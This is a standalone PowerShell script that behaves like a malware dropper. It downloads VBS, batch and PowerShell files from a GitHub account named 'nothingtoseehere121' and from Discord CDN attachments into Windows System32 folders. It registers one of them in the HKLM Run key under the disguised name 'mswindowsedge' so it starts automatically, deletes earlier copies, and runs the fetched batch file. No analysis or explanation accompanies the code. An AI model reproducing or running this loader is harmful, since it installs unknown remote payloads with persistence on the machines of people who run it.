$Folder = 'C:\Windows\System32\drivers\script12.ps1'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
    C:\Windows\System32\Microsoft\cmd.bat
} else {
    "Path doesn't exist."
    cd C:\Windows\System32\drivers ; powershell.exe Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name System32 ; Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name Windows ; Invoke-WebRequest "https://raw.githubusercontent.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/main/Windowsmsedge.vbs" -OutFile Windowsmsedge.vbs ; New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name mswindowsedge -PropertyType String -Value C:\Windows\System32\drivers\Windowsmsedge.vbs ; rm C:\Windows\System32\Microsoft\cmd.bat ; rm C:\Windows\System32\Microsoft\System.ps1 ; rm C:\Windows\System32\Microsoft\Win_System.bat ; rm C:\Windows\System32\Microsoft\script12.ps1 ; cd C:\Windows\System32\drivers\ ; Invoke-WebRequest "https://raw.githubusercontent.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/main/script12GS-02.ps1" -OutFile script12.ps1 ; Invoke-WebRequest "https://cdn.discordapp.com/attachments/919929625335959592/966008650256764998/cmd.bat" -OutFile cmd.bat ; cd C:\Windows\System32 ; Invoke-WebRequest "https://cdn.discordapp.com/attachments/919929625335959592/966008650655207424/System.ps1" -OutFile System.ps1 ; Invoke-WebRequest "https://cdn.discordapp.com/attachments/919929625335959592/966008650873339904/Win_System.bat" -OutFile Win_System.bat; C:\Windows\System32\drivers\cmd.bat
}